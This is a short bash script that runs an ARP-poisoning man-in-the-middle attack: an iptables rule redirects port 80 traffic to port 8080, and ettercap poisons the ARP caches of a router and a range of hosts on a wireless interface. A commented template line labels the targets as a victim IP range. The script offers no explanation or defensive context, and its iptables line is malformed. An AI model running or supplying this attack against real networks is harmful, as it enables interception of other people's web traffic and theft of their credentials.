#!usr/bin/bash

iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080

ettercap -Tq -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//
# ettercap -Tq -M arp:remote -i wlan0 -S /<router_ip>// /<victem_ip_range>//

